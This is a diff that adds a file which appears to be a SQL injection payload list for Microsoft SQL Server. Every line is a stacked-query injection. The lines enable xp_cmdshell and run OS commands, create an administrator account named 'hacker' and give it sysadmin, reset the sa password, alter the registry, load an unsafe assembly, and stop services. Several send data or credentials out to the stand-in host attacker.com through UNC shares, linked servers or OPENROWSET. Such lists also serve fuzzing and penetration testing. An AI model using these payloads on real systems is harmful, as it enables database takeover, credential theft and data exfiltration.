@@ -1,0 +1,104 @@
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+'; EXEC master..xp_cmdshell 'ping attacker.com'--
+'; EXEC master..xp_cmdshell 'net user hacker password /add'--
+'; EXEC master..xp_cmdshell 'net localgroup administrators hacker /add'--
+'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName'--
+'; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Test','Value','REG_SZ','Hacked'--
+'; EXEC xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Test'--
+'; EXEC xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Test','Value'--
+'; EXEC sp_OACreate 'WScript.Shell',@shell OUTPUT; EXEC sp_OAMethod @shell,'run',NULL,'cmd.exe /c whoami'--
+'; EXEC sp_OACreate 'Scripting.FileSystemObject',@fso OUTPUT; EXEC sp_OAMethod @fso,'CreateTextFile',NULL,'C:\test.txt',1--
+'; EXEC sp_OACreate 'ADODB.Stream',@stream OUTPUT; EXEC sp_OASetProperty @stream,'Type',1; EXEC sp_OAMethod @stream,'Open'; EXEC sp_OAMethod @stream,'LoadFromFile',NULL,'C:\Windows\win.ini'--
+'; DECLARE @cmd VARCHAR(8000); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd--
+'; DECLARE @query VARCHAR(8000); SET @query='SELECT @@version'; EXEC(@query)--
+'; CREATE PROCEDURE sp_hacked AS EXEC xp_cmdshell('whoami'); EXEC sp_hacked; DROP PROCEDURE sp_hacked--
+'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\share\\backup.bak'--
+'; RESTORE DATABASE master FROM DISK='\\\\attacker.com\\share\\backup.bak'--
+'; EXEC xp_dirtree '\\\\attacker.com\\share'--
+'; EXEC xp_fileexist '\\\\attacker.com\\share\\test.txt'--
+'; EXEC xp_subdirs '\\\\attacker.com\\share'--
+'; EXEC sp_addlinkedserver 'attacker','','SQLOLEDB','attacker.com'; EXEC sp_addlinkedsrvlogin 'attacker','false',NULL,'sa','password'--
+'; SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=password','SELECT 1')--
+'; SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=password').master.dbo.sysobjects--
+'; SELECT * FROM OPENQUERY([attacker],'SELECT @@version')--
+'; EXEC sp_makewebtask '\\\\attacker.com\\share\\output.html','SELECT * FROM users'--
+'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE--
+'; EXEC sp_configure 'Ad Hoc Distributed Queries',1; RECONFIGURE--
+'; EXEC sp_configure 'remote access',1; RECONFIGURE--
+'; EXEC sp_configure 'remote admin connections',1; RECONFIGURE--
+'; EXEC sp_addextendedproc 'xp_hacked','C:\hacked.dll'--
+'; EXEC xp_hacked--
+'; EXEC sp_dropextendedproc 'xp_hacked'--
+'; CREATE ASSEMBLY hacked FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000 WITH PERMISSION_SET=UNSAFE--
+'; EXEC sp_executesql N'EXEC xp_cmdshell ''whoami'''--
+'; EXEC sp_executesql N'SELECT @@version'--
+'; DECLARE @T TABLE(output VARCHAR(8000)); INSERT INTO @T EXEC xp_cmdshell 'whoami'; SELECT * FROM @T--
+'; DECLARE @result VARCHAR(8000); EXEC xp_cmdshell 'whoami',@result OUTPUT; SELECT @result--
+'; EXEC master..xp_servicecontrol 'start','MSSQLSERVER'--
+'; EXEC master..xp_servicecontrol 'stop','MSSQLSERVER'--
+'; EXEC master..xp_availablemedia--
+'; EXEC master..xp_enumgroups--
+'; EXEC master..xp_loginconfig--
+'; EXEC master..xp_msver--
+'; EXEC master..xp_instance_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\MSSQLServer','LoginMode'--
+'; EXEC master..xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\MSSQLServer'--
+'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\MSSQLServer','LoginMode'--
+'; EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\MSSQLServer','LoginMode','REG_DWORD',2--
+'; EXEC master..xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Test'--
+'; EXEC master..xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Test','Value'--
+'; EXEC master..xp_regaddmultistring 'HKEY_LOCAL_MACHINE','SOFTWARE\Test','Value','Test'--
+'; EXEC master..xp_regremovemultistring 'HKEY_LOCAL_MACHINE','SOFTWARE\Test','Value','Test'--
+'; EXEC master..xp_terminate_process 1234--
+'; EXEC master..xp_sprintf @output OUTPUT,'%s','test'--
+'; EXEC master..xp_sscanf 'test','%s',@output OUTPUT--
+'; EXEC master..xp_getnetname--
+'; EXEC master..xp_logininfo 'BUILTIN\Administrators'--
+'; EXEC master..xp_grantlogin 'BUILTIN\Users'--
+'; EXEC master..xp_revokelogin 'BUILTIN\Users'--
+'; EXEC master..sp_addlogin 'hacker','password'--
+'; EXEC master..sp_addsrvrolemember 'hacker','sysadmin'--
+'; EXEC master..sp_password NULL,'password','sa'--
+'; EXEC master..sp_who--
+'; EXEC master..sp_lock--
+'; EXEC master..sp_helpdb--
+'; EXEC master..sp_helplogins--
+'; EXEC master..sp_helpuser--
+'; EXEC master..sp_helprole--
+'; EXEC master..sp_helprolemember--
+'; EXEC master..sp_helptext 'sp_configure'--
+'; EXEC master..sp_helpfile--
+'; EXEC master..sp_helpfilegroup--
+'; EXEC master..sp_helpindex 'users'--
+'; EXEC master..sp_helpconstraint 'users'--
+'; EXEC master..sp_helptrigger 'users'--
+'; EXEC master..sp_helpstats 'users'--
+'; EXEC master..sp_spaceused 'users'--
+'; EXEC master..sp_depends 'users'--
+'; EXEC master..sp_stored_procedures--
+'; EXEC master..sp_tables--
+'; EXEC master..sp_columns 'users'--
+'; EXEC master..sp_server_info--
+'; EXEC master..sp_datatype_info--
+'; EXEC master..sp_special_columns 'users'--
+'; EXEC master..sp_statistics 'users'--
+'; EXEC master..sp_table_privileges 'users'--
+'; EXEC master..sp_column_privileges 'users'--
+'; EXEC master..sp_databases--
+'; EXEC master..sp_pkeys 'users'--
+'; EXEC master..sp_fkeys 'users'--
+'; EXEC master..sp_monitor--
+'; EXEC master..sp_readerrorlog--
+'; EXEC master..sp_enumerrorlogs--
+'; EXEC master..sp_cycle_errorlog--
+'; EXEC master..sp_configure--
+'; EXEC master..sp_configure 'show advanced options'--
+'; EXEC master..sp_configure 'xp_cmdshell'--
+'; EXEC master..sp_configure 'Ole Automation Procedures'--
+'; EXEC master..sp_configure 'Ad Hoc Distributed Queries'--
+'; EXEC master..sp_configure 'remote access'--
+'; EXEC master..sp_configure 'remote admin connections'--
+'; EXEC master..sp_configure 'clr enabled'--
+'; EXEC master..sp_configure 'Database Mail XPs'--
+'; EXEC master..sp_configure 'SMO and DMO XPs'--
+'; EXEC master..sp_configure 'SQL Mail XPs'--
